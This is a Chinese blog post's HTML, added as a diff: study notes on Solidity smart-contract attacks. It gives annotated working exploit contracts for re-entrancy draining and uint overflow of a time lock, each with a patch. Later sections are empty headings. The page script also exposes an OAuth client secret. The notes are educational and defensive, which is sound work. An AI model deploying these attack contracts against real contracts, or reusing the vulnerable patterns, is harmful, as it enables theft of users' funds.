@@ -1,0 +1,707 @@
+<!DOCTYPE html>
+<html>
+
+<head>
+    <meta charset="utf-8" />
+<title>
+    ztree
+</title>
+<!--[if lt IE 9]><script src="//cdn.bootcss.com/html5shiv/r29/html5.js"></script><![endif]-->
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport" />
+<meta http-equiv="x-dns-prefetch-control" content="on">
+<link rel="dns-prefetch" href="https://fastly.jsdelivr.net">
+<meta name="author" content="ztree">
+<meta name="description" content="竹杖芒鞋轻胜马，谁怕？一蓑烟雨任平生。">
+<meta name="keywords" content="Binary">
+<script async src="//instant.page/3.0.0" type="module" defer integrity="sha384-OeDn4XE77tdHo8pGtE1apMPmAipjoxUQ++eeJa6EtJCfHlvijigWiJpD7VDPWXV1"></script>
+<link rel="stylesheet" href="https://lzxzl.github.io/styles/main.css" />
+<link href="https://fastly.jsdelivr.net/npm/font-awesome@4.7.0/css/font-awesome.min.css" rel="stylesheet">
+<script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/1.7.1/jquery.min.js"></script>
+
+    <link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/css/style.min.css" />
+    <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/tocbot.min.js"></script>
+    <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/script.min.js"></script>
+    <script src="https://fastly.jsdelivr.net/gh/itjoker233/Gridea-theme-Chic/assets/media/script/icon.min.js"></script>
+    
+            <script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/Card/prism.min.js"></script>
+            <link rel="stylesheet" href="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/css/Card/prism.min.css" />
+            <link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.css">
+            <script defer src="https://fastly.jsdelivr.net/npm/katex@0.10.1/dist/katex.min.js"></script>
+            
+                        <!--CDN样式-->
+                        <script src="https://fastly.jsdelivr.net/gh/ITJoker233/ITJoker233.github.io@latest/CDN/js/hit-kounter-lc-0.3.0.js"></script>
+                        <script src="https://cdn1.lncld.net/static/js/av-min-1.5.0.js"></script>
+                        
+                            <script>
+                                (function() {
+                                    var bp = document.createElement('script');
+                                    var curProtocol = window.location.protocol.split(':')[0];
+                                    if (curProtocol === 'https') {
+                                        bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+                                    } else {
+                                        bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+                                    }
+                                    var s = document.getElementsByTagName("script")[0];
+                                    s.parentNode.insertBefore(bp, s);
+                                })();
+                            </script>
+                            
+</head>
+
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo">
+                <a href="https://lzxzl.github.io">
+                    ztree
+                </a>
+            </div>
+            <div id="tp-weather-widget"></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/">
+                        首页
+                    </a>
+                    
+                    <a class="menu-item" href="/archives">
+                        归档
+                    </a>
+                    
+                    <a class="menu-item" href="/tags">
+                        标签
+                    </a>
+                    
+                    <a class="menu-item" href="/post/about">
+                        关于
+                    </a>
+                    
+                        <input id="switch_default" type="checkbox" class="switch_default">
+                        <label for="switch_default" class="toggleBtn"></label>
+            </div>
+            <form id="gridea-search-form" data-update="1747748455692" action="/search/index.html">
+                <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+            </form>
+        </div>
+    </nav>
+
+    
+        <nav class="navbar-mobile" id="nav-mobile">
+            <div class="container">
+                <div class="navbar-header">
+                    <div>
+                        <a href="https://lzxzl.github.io">
+                            ztree
+                        </a>
+                        <!--en-->
+                        <a id="mobile-toggle-theme-en" class="a en">&nbsp;Dark</a>
+                        <!--zh-->
+                        <a id="mobile-toggle-theme-zh" class="a zh">&nbsp;&#x6697;&#x9ED1;</a>
+                    </div>
+                    <form id="gridea-search-form" data-update="1747748455692" action="/search/index.html">
+                        <input class="search-input" autocomplete="off" spellcheck="false" name="q" autofocus="true" placeholder="Search...">
+                    </form>
+                    <!--en-->
+                    <div class="menu-toggle" id="menu-toggle-en" onclick="mobileBtn()">&#9776; Menu</div>
+                    <!--zh-->
+                    <div class="menu-toggle" id="menu-toggle-zh" onclick="mobileBtn()">&#9776; &#x83DC;&#x5355;</div>
+
+                </div>
+                <div class="menu" id="mobile-menu">
+                    
+                        <a class="menu-item" href="/">
+                            首页
+                        </a>
+                        
+                        <a class="menu-item" href="/archives">
+                            归档
+                        </a>
+                        
+                        <a class="menu-item" href="/tags">
+                            标签
+                        </a>
+                        
+                        <a class="menu-item" href="/post/about">
+                            关于
+                        </a>
+                        
+                </div>
+            </div>
+        </nav>
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementById("menu-toggle-en");
+        var toggleMenu_zh = document.getElementById("menu-toggle-zh");
+
+        var mobileMenu = document.getElementById("mobile-menu");
+        if (toggleMenu.display != "none") {
+            if (toggleMenu.classList.contains("active")) {
+                toggleMenu.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        } else if (toggleMenu_zh.display != "none") {
+            if (toggleMenu_zh.classList.contains("active")) {
+                toggleMenu_zh.classList.remove("active")
+                mobileMenu.classList.remove("active")
+            } else {
+                toggleMenu_zh.classList.add("active")
+                mobileMenu.classList.add("active")
+            }
+        }
+
+    }
+</script>
+
+
+
+    <script>
+        (function(a, h, g, f, e, d, c, b) {
+            b = function() {
+                d = h.createElement(g);
+                c = h.getElementsByTagName(g)[0];
+                d.src = e;
+                d.charset = "utf-8";
+                d.async = 1;
+                c.parentNode.insertBefore(d, c)
+            };
+            a["SeniverseWeatherWidgetObject"] = f;
+            a[f] || (a[f] = function() {
+                (a[f].q = a[f].q || []).push(arguments)
+            });
+            a[f].l = +new Date();
+            if (a.attachEvent) {
+                a.attachEvent("onload", b)
+            } else {
+                a.addEventListener("load", b, false)
+            }
+        }(window, document, "script", "SeniverseWeatherWidget", "//cdn.sencdn.com/widget2/static/js/bundle.js?t=" + parseInt((new Date().getTime() / 100000000).toString(), 10)));
+        window.SeniverseWeatherWidget('show', {
+            flavor: "slim",
+            location: "WWEFQFPJZ7T8",
+            geolocation: true,
+            language: "auto",
+            unit: "c",
+            theme: "auto",
+            token: "61bcc333-3305-4728-9465-6785274bb0a3",
+            hover: "enabled",
+            container: "tp-weather-widget"
+        })
+    </script>
+    
+            <div class="main">
+                <div class="container">
+                    <article class="post-wrap">
+                        <header class="post-header">
+                            <h1 class="post-title">
+                                Solidity Hacks
+                            </h1>
+                            
+                                    <!--zh-->
+                                    <div class="post-meta zh">
+                                        &#x4F5C;&#x8005;:
+                                        <a itemprop="author" rel="author" href="/">
+                                            ztree
+                                        </a>
+                                        <span class="post-time">&#x65E5;&#x671F;: <a href="#">2025-01-19</a></span>
+                                        <span class="post-readtime">&#x9605;&#x8BFB;&#x65F6;&#x95F4;:<a
+                                    href="#">8.6
+                                    &#x5206;&#x949F;</a></span>
+                                        <span class="post-words">&#x5B57;&#x6570;:<a href="#">1709</a></span>
+                                        
+                                                阅读量:
+                                                <span data-hk-page="current"> - </span>
+                                                
+                                    </div>
+                                    
+                        </header>
+                        
+                        <div class="post-content">
+                            <ul>
+<li>2025.1.19: 0x01~0x02</li>
+</ul>
+<h1 id="hacks">Hacks</h1>
+<h2 id="0x01-re-entrancy重入攻击">0x01 Re-Entrancy（重入攻击）</h2>
+<h3 id="demo学习">demo学习</h3>
+<ol>
+<li>部署 EtherStore 合约</li>
+<li>账号1 Alice 和帐号2 Bob 各自存入 1 Ether 到 EtherStore</li>
+<li>用EtherStore的地址部署Attack合约</li>
+<li>攻击者Eve调用Attack.attack，往 EtherStore 存 1 ether后取出，那么他将拿回来 3 ether。</li>
+</ol>
+<blockquote>
+<p>攻击者可以在 EtherStore.withdraw 完成执行之前，多次调用 EtherStore.withdraw。<br>
+函数调用过程见下面注释</p>
+</blockquote>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+/*
+EtherStore is a contract where you can deposit and withdraw ETH.
+This contract is vulnerable to re-entrancy attack.
+Let's see why.
+
+1. Deploy EtherStore
+2. Deposit 1 Ether each from Account 1 (Alice) and Account 2 (Bob) into EtherStore
+3. Deploy Attack with address of EtherStore
+4. Call Attack.attack sending 1 ether (using Account 3 (Eve)).
+   You will get 3 Ethers back (2 Ether stolen from Alice and Bob,
+   plus 1 Ether sent from this contract).
+
+What happened?
+Attack was able to call EtherStore.withdraw multiple times before
+EtherStore.withdraw finished executing.
+
+Here is how the functions were called
+- Attack.attack
+- EtherStore.deposit
+- EtherStore.withdraw
+- Attack fallback (receives 1 Ether)
+- EtherStore.withdraw
+- Attack.fallback (receives 1 Ether)
+- EtherStore.withdraw
+- Attack fallback (receives 1 Ether)
+*/
+
+contract EtherStore {
+    mapping(address =&gt; uint256) public balances;
+
+    function deposit() public payable { // 【2】存 1 ether
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() public {
+        uint256 bal = balances[msg.sender]; // 【4】取余额，并检查必须大于0
+        require(bal &gt; 0);
+
+		// 【5】这里call一个不存在的函数，将触发调用者Attack合约里的fallback函数
+		// 传过去的值为所有余额，也就是会把所有余额取出
+        (bool sent,) = msg.sender.call{value: bal}(&quot;&quot;); 
+        // 【8】因为这里call会等待Attack的fallback函数执行结束再往下走，所以这里会递归执行withdraw
+        // 而因为没有执行下面的清空操作 balances[msg.sender] = 0，所以上面的require检查是会通过的，再次转钱！
+        require(sent, &quot;Failed to send Ether&quot;);
+
+        balances[msg.sender] = 0;
+    }
+
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+
+contract Attack {
+    EtherStore public etherStore;
+    uint256 public constant AMOUNT = 1 ether;
+
+    constructor(address _etherStoreAddress) {
+        etherStore = EtherStore(_etherStoreAddress);
+    }
+
+    // Fallback is called when EtherStore sends Ether to this contract.
+    //【6】当EtherStore 把 1 ether发回到这个合约的时候（也就是攻击者收1 ether）就会调用fallback函数
+    fallback() external payable { 
+        if (address(etherStore).balance &gt;= AMOUNT) {
+            etherStore.withdraw(); // 【7】只要EtherStore合约里还有余额就再次调用withdraw
+        }
+    }
+
+    function attack() external payable {
+        require(msg.value &gt;= AMOUNT);
+        etherStore.deposit{value: AMOUNT}(); // 【1】 攻击者存 1 ether
+        etherStore.withdraw(); // 【3】 攻击者取 1 ether
+    }
+
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+
+</code></pre>
+<blockquote>
+<p>再看一下用 call 和 fallback 来转账</p>
+</blockquote>
+<pre><code class="language-solidity">    function withdraw() public {
+        uint256 bal = balances[msg.sender];
+        require(bal &gt; 0);
+
+		// 这是在以太坊上发送 ETH 的低级调用方法
+		// `msg.sender` 是接收 ETH 的地址
+		// `{value: bal}` 指定要发送的 ETH 数量
+		// `(&quot;&quot;)` 表示这是一个没有调用任何函数的纯转账
+		// 这个调用会返回两个值:(bool, bytes memory)，第一个值表示调用是否成功(true/false)
+        (bool sent,) = msg.sender.call{value: bal}(&quot;&quot;); 
+        require(sent, &quot;Failed to send Ether&quot;);
+
+        balances[msg.sender] = 0;
+    }
+</code></pre>
+<p>那么怎样写才是正确的呢?</p>
+<ul>
+<li>确保状态更改在合约交互之前</li>
+<li>用 function modifiers 来防重入攻击
+<ul>
+<li><code>modifier</code> 关键字用于声明修饰器。</li>
+<li><code>modifierName</code> 是修饰器的名称。</li>
+<li><code>parameters</code> 是可选的参数列表。</li>
+<li><code>_</code> 是一个特殊的占位符，表示函数的代码将在该位置执行。</li>
+</ul>
+</li>
+</ul>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.8.26;
+
+contract ReEntrancyGuard {
+    bool internal locked;
+
+    modifier noReentrant() {
+        require(!locked, &quot;No re-entrancy&quot;);
+        locked = true;
+        _;
+        locked = false;
+    }
+}
+</code></pre>
+<p>试着patch一下上面的合约</p>
+<pre><code class="language-solidity">contract EtherStore {
+	bool internal locked;
+    mapping(address =&gt; uint256) public balances;
+
+	modifier noReentrant() {
+        require(!locked, &quot;No re-entrancy&quot;);
+        locked = true;
+        _;
+        locked = false;
+    }
+
+    function deposit() public payable {
+        balances[msg.sender] += msg.value;
+    }
+
+    function withdraw() public noReentrant{ // [patch 2]加上 function modifiers 来防重入攻击
+        uint256 bal = balances[msg.sender];
+        require(bal &gt; 0);
+
+		balances[msg.sender] = 0; // [patch 1]把state变量的修改放到合约交互前
+		
+        (bool sent,) = msg.sender.call{value: bal}(&quot;&quot;); 
+        
+        require(sent, &quot;Failed to send Ether&quot;);
+        
+    }
+
+    // Helper function to check the balance of this contract
+    function getBalance() public view returns (uint256) {
+        return address(this).balance;
+    }
+}
+</code></pre>
+<h3 id="real-world-exampledao">Real World Example:DAO</h3>
+<blockquote>
+<p>https://github.com/demining/Dao-Exploit<br>
+https://www.addesp.com/archives/186</p>
+</blockquote>
+<h2 id="0x02-arithmetic-overflow-and-underflow">0x02 Arithmetic Overflow and Underflow</h2>
+<blockquote>
+<p>Default behaviour of Solidity 0.8 for overflow / underflow is to throw an error.<br>
+0.8版本及以后自动检测并抛出错误，但是之前的版本需要注意。</p>
+</blockquote>
+<p>TimeLock 合约是让人存进去之后一周内不能取款，而且提供了一个函数可以让用户增加这个“锁钱”的时间。而如果攻击成功的话，攻击者可以立即取钱。具体过程见注释</p>
+<pre><code class="language-solidity">// SPDX-License-Identifier: MIT
+pragma solidity ^0.7.6;
+
+// This contract is designed to act as a time vault.
+// User can deposit into this contract but cannot withdraw for at least a week.
+// User can also extend the wait time beyond the 1 week waiting period.
+
+/*
+1. Deploy TimeLock
+2. Deploy Attack with address of TimeLock
+3. Call Attack.attack sending 1 ether. You will immediately be able to
+   withdraw your ether.
+
+What happened?
+Attack caused the TimeLock.lockTime to overflow and was able to withdraw
+before the 1 week waiting period.
+*/
+
+contract TimeLock {
+    mapping(address =&gt; uint256) public balances;
+    mapping(address =&gt; uint256) public lockTime;
+
+	// [1] 存钱，并将lockTime[msg.sender]加 1 week
+    function deposit() external payable { 
+        balances[msg.sender] += msg.value;
+        lockTime[msg.sender] = block.timestamp + 1 weeks;
+    }
+
+	// [2] 增加lock time
+    function increaseLockTime(uint256 _secondsToIncrease) public { 
+        lockTime[msg.sender] += _secondsToIncrease;
+    }
+
+	// [3] 取钱，取之前有两个检查：1）余额大于0；2）当前时间要在lock time之后
+    function withdraw() public {
+        require(balances[msg.sender] &gt; 0, &quot;Insufficient funds&quot;);
+        require(block.timestamp &gt; lockTime[msg.sender], &quot;Lock time not expired&quot;);
+
+        uint256 amount = balances[msg.sender];
+        balances[msg.sender] = 0;
+
+        (bool sent,) = msg.sender.call{value: amount}(&quot;&quot;);
+        require(sent, &quot;Failed to send Ether&quot;);
+    }
+}
+
+// [4] 所以，如果想立即取钱，就需要让lock time （lockTime[msg.sender]）尽可能提前，最好是0
+
+contract Attack {
+    TimeLock timeLock;
+
+    constructor(TimeLock _timeLock) {
+        timeLock = TimeLock(_timeLock);
+    }
+
+    fallback() external payable {}
+
+    function attack() public payable {
+        timeLock.deposit{value: msg.value}(); // [5] 存钱
+        /*
+        if t = current lock time then we need to find x such that
+        x + t = 2**256 = 0 // 无符号整型 overflow
+        so x = -t
+        2**256 = type(uint).max + 1
+        so x = type(uint).max + 1 - t
+        */
+        // [6] 想法子让lock time设置为当前时间，那么再下一步取钱的时候，那个时候就会在lock time后面了
+        // 而法子具体见上面的注释，调用increaseLockTime就会发生计算：0 - locktime + locktime = 0
+        // 最后把lockTime[msg.sender] 设置为0
+        timeLock.increaseLockTime(
+            type(uint256).max + 1 - timeLock.lockTime(address(this))
+        );
+        // [7] 取钱的时候就能直接取
+        timeLock.withdraw();
+    }
+}
+
+</code></pre>
+<blockquote>
+<p>怎么理解：timeLock.lockTime(address(this)？<br>
+是在访问 TimeLock 合约中的 public mapping，因为这个映射是 public 的，Solidity 自动为它生成了一个同名的 getter 函数。这个 getter 函数可以通过传入地址来查询对应的锁定时间。</p>
+</blockquote>
+<p>patch则是使用数学库或者自己加上检查，比如之前入门demo里那样，在加完之后assert一下<br>
+<img src="https://lzxzl.github.io/post-images/1737259861140.png" alt="" loading="lazy"></p>
+<h3 id="real-world-example-powhc-and-batch-transfer-overflow-cve-201810299">Real-World Example: PoWHC and Batch Transfer Overflow (CVE-2018–10299)</h3>
+<ul>
+<li>https://medium.com/@ebanisadr/how-800k-evaporated-from-the-powh-coin-ponzi-scheme-overnight-1b025c33b530</li>
+<li>https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md</li>
+<li>https://peckshield.medium.com/alert-new-batchoverflow-bug-in-multiple-erc20-smart-contracts-cve-2018-10299-511067db6536</li>
+</ul>
+<h2 id="0x03-self-destruct">0x03 Self Destruct</h2>
+<h2 id="0x04-accessing-private-data">0x04 Accessing Private Data</h2>
+<h2 id="0x05-delegatecall">0x05 Delegatecall</h2>
+<h2 id="0x06-source-of-randomness">0x06 Source of Randomness</h2>
+<h2 id="0x07-denial-of-service">0x07 Denial of Service</h2>
+<h2 id="0x08-phishing-with-txorigin">0x08 Phishing with tx.origin</h2>
+<h2 id="0x09-hiding-malicious-code-with-external-contract">0x09 Hiding Malicious Code with External Contract</h2>
+<h2 id="0x0a-honeypot">0x0A Honeypot</h2>
+<h2 id="0x0b-front-running">0x0B Front Running</h2>
+<h2 id="0x0c-block-timestamp-manipulation">0x0C Block Timestamp Manipulation</h2>
+<h2 id="0x0d-signature-replay">0x0D Signature Replay</h2>
+<h2 id="0x0e-bypass-contract-size-check">0x0E Bypass Contract Size Check</h2>
+<h2 id="0x0f-deploy-different-contracts-at-the-same-address">0x0F Deploy Different Contracts at the Same Address</h2>
+<h2 id="0x10-vault-inflation">0x10 Vault Inflation</h2>
+<h2 id="0x11-weth-permit">0x11 WETH Permit</h2>
+<h1 id="参考文献">参考文献</h1>
+<ul>
+<li>https://solidity-by-example.org/hacks/re-entrancy/</li>
+<li>https://github.com/demining/Dao-Exploit</li>
+</ul>
+
+                        </div>
+                        
+                            <div class="post-toc">
+                                <ul class="markdownIt-TOC">
+<li><a href="#hacks">Hacks</a>
+<ul>
+<li><a href="#0x01-re-entrancy%E9%87%8D%E5%85%A5%E6%94%BB%E5%87%BB">0x01 Re-Entrancy（重入攻击）</a>
+<ul>
+<li><a href="#demo%E5%AD%A6%E4%B9%A0">demo学习</a></li>
+<li><a href="#real-world-exampledao">Real World Example:DAO</a></li>
+</ul>
+</li>
+<li><a href="#0x02-arithmetic-overflow-and-underflow">0x02 Arithmetic Overflow and Underflow</a>
+<ul>
+<li><a href="#real-world-example-powhc-and-batch-transfer-overflow-cve-201810299">Real-World Example: PoWHC and Batch Transfer Overflow (CVE-2018–10299)</a></li>
+</ul>
+</li>
+<li><a href="#0x03-self-destruct">0x03 Self Destruct</a></li>
+<li><a href="#0x04-accessing-private-data">0x04 Accessing Private Data</a></li>
+<li><a href="#0x05-delegatecall">0x05 Delegatecall</a></li>
+<li><a href="#0x06-source-of-randomness">0x06 Source of Randomness</a></li>
+<li><a href="#0x07-denial-of-service">0x07 Denial of Service</a></li>
+<li><a href="#0x08-phishing-with-txorigin">0x08 Phishing with tx.origin</a></li>
+<li><a href="#0x09-hiding-malicious-code-with-external-contract">0x09 Hiding Malicious Code with External Contract</a></li>
+<li><a href="#0x0a-honeypot">0x0A Honeypot</a></li>
+<li><a href="#0x0b-front-running">0x0B Front Running</a></li>
+<li><a href="#0x0c-block-timestamp-manipulation">0x0C Block Timestamp Manipulation</a></li>
+<li><a href="#0x0d-signature-replay">0x0D Signature Replay</a></li>
+<li><a href="#0x0e-bypass-contract-size-check">0x0E Bypass Contract Size Check</a></li>
+<li><a href="#0x0f-deploy-different-contracts-at-the-same-address">0x0F Deploy Different Contracts at the Same Address</a></li>
+<li><a href="#0x10-vault-inflation">0x10 Vault Inflation</a></li>
+<li><a href="#0x11-weth-permit">0x11 WETH Permit</a></li>
+</ul>
+</li>
+<li><a href="#%E5%8F%82%E8%80%83%E6%96%87%E7%8C%AE">参考文献</a></li>
+</ul>
+
+                            </div>
+                            
+                                
+                                    
+                                            <!--zh-->
+                                            <section class="post-copyright zh">
+                                                <p class="copyright-item ">
+                                                    <span>&#x4F5C;&#x8005;:</span>
+                                                    <span>ztree</span>
+                                                </p>
+
+                                                <p class="copyright-item">
+                                                    <span>&#x6C38;&#x4E45;&#x94FE;&#x63A5;:</span>
+                                                    <span><a href="https://lzxzl.github.io/post/solidity-hacks/">https://lzxzl.github.io/post/solidity-hacks/</a></span>
+                                                </p>
+
+                                                <p class="copyright-item">
+                                                    <span>&#x534F;&#x8BAE;:</span>
+                                                    <span>MIT License</span>
+                                                </p>
+                                            </section>
+                                            
+                                                
+                                                    
+                                                                    <!--Share-->
+                                                                    <span style="margin-right:15px">
+                        <i class="post-share"></i>
+                        <span>&#x5206;&#x4EAB;:</span>
+                                                                    <a title="QR 码" target="_blank" href="https://api.qrserver.com/v1/create-qr-code/?size=150x150&data=https://lzxzl.github.io/post/solidity-hacks/"><i class="fa fa-qrcode"></i></a>
+                                                                    <a title="QQ" target="_blank" href="https://sns.qzone.qq.com/cgi-bin/qzshare/cgi_qzshare_onekey?url=https://lzxzl.github.io/post/solidity-hacks/&sharesource=qzone&title=Solidity Hacks&pics=https://lzxzl.github.io/images/avatar.png?v=1747748455692&summary="><i class="fa fa-qq"></i></a>
+                                                                    <a title="新浪微博" target="_blank" href="https://service.weibo.com/share/share.php?url=https://lzxzl.github.io/post/solidity-hacks/&sharesource=weibo&title=Solidity Hacks + " - " + &pic="https://lzxzl.github.io/images/avatar.png?v=1747748455692 "><i class="fa fa-weibo "></i></a>
+
+                                                                    </span>
+                                                                    
+                                                                            <!--zh-->
+                                                                            <section class="post-tags zh ">
+                                                                                <div>
+                                                                                    <span>&#x6807;&#x7B7E;:</span>
+                                                                                    <span class="tag ">
+                        
+                                </span>
+                                                                                </div>
+                                                                                <div>
+                                                                                    <a href="javascript:window.history.back();">
+                        &#x8FD4;&#x56DE;</a>
+                                                                                    <span>&dot;</span>
+                                                                                    <a href="#">&#x4E3B;&#x9875;</a>
+                                                                                </div>
+                                                                            </section>
+
+                                                                            
+                                                                                <!---->
+                                                                                <section class="post-nav">
+                                                                                    
+                                                                                        <a class="prev" rel="prev" href="https://lzxzl.github.io/post/pz-issue-42451713fixed-with-cve-2024-33060-incorrect-searching-algorithm-in-fastrpc_mmap_find-leads-to-kernel-address-space-info-leak/">
+                                                                                            PZ Issue 42451713(fixed with CVE-2024-33060) - Incorrect searching algorithm in fastrpc_mmap_find leads to kernel address space info leak
+                                                                                        </a>
+                                                                                        
+                                                                                            
+                                                                                                <a class="next" rel="next" href="https://lzxzl.github.io/post/cve-2024-33060-uaf-race-of-global-maps-in-fastrpc_mmap_create-and-epilogue-functions/">
+                                                                                                    CVE-2024-33060 UAF race of global maps in fastrpc_mmap_create (and epilogue functions)
+                                                                                                </a>
+                                                                                                
+                                                                                </section>
+                    </article>
+                </div>
+                
+                    
+                        <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container" style="width: 100%;max-width: 780px;margin: auto;"></div>
+
+<script>
+    var gitalk = new Gitalk({
+        clientID: '2a44a295dd16ae7d05b8',
+        clientSecret: '8030257bc11446a193cf383767567daca0e26312',
+        repo: 'lzxzl.github.io',
+        owner: 'lzxzl',
+        admin: ['lzxzl'],
+        id: (location.pathname).substring(0, 49), // Ensure uniqueness and length less than 50
+        distractionFreeMode: false // Facebook-like distraction free mode
+    })
+
+    gitalk.render('gitalk-container')
+</script>
+                            
+                                        
+                                            
+            </div>
+    </div>
+    </div>
+    </div>
+    
+        <footer id="footer" class="footer">
+            <div class="copyright">
+                
+                        ztree
+                            
+                                        <svg viewBox="0 0 1024 1024" style="margin-left: 5px;margin-right: 5px;" version="1.0" width="8" height="8" class="my-face">
+            <path
+                d="M863.597631 513.574282l-271.33965-140.213484L729.783667 81.926656c3.583731-7.87141 7.167462-15.742819 7.167462-25.214109C736.887134 25.226908 708.345275 0.012799 672.635953 0.012799a63.611229 63.611229 0 0 0-39.293053 12.607055c-1.791866 1.59988-3.519736 3.19976-5.311602 3.19976L147.87531 418.925381a55.547834 55.547834 0 0 0-19.646527 47.356448c1.791866 17.278704 14.27093 33.021523 32.125591 42.492813l271.33965 141.749369L292.504463 945.221908c-12.479064 25.214109-1.791866 53.563983 23.166262 69.306802 10.751194 6.335525 23.230258 9.47129 35.709322 9.47129 16.062795 0 32.125591-4.735645 44.604655-15.742819l480.091993-403.297753a55.547834 55.547834 0 0 0 19.646526-47.228458 61.243407 61.243407 0 0 0-32.12559-44.156688z"
+                fill="#93b5cf"></path>
+        </svg>
+                                        ztree &copy;Copyright
+                                            <script>
+                                                var date = new Date();
+                                                document.write("" + date.getFullYear());
+                                            </script>
+                                            | Powered by
+                                            <a href="https://lzxzl.github.io/" target="_blank">
+                                                ztree
+                                            </a>
+            </div>
+            <div id="update" style="display:none;">
+                off
+            </div>
+            
+                    <script>
+                        var port = '';
+                        
+                        document.write('<div id="home_path" style="display:none;">' + document.location.protocol + '//' + window.document.location.hostname + port + '</div>')
+                    </script>
+        </footer>
+        
+                <script>
+                    
+                    
+                    
+                    getStar();
+                    hljs.initHighlighting();
+                    console.clear();
+                    
+                    var newDate = new Date();
+                    newDate.setTime(1747748455692);
+                    console.log(" Blog Update Time: " + newDate.toLocaleDateString());
+                    console.log("\n %c \u26a1Theme:Chic Author's Blog:https://blog.itjoker.cn  Write By ITJoker  \n\n", "color: #ffffff; background: rgba(49, 49, 49, 0.85); padding:5px 0;border-radius:5px;");
+                </script>
+        </div>
+</body>
+<script>
+    scroll();
+</script>
+
+</html>
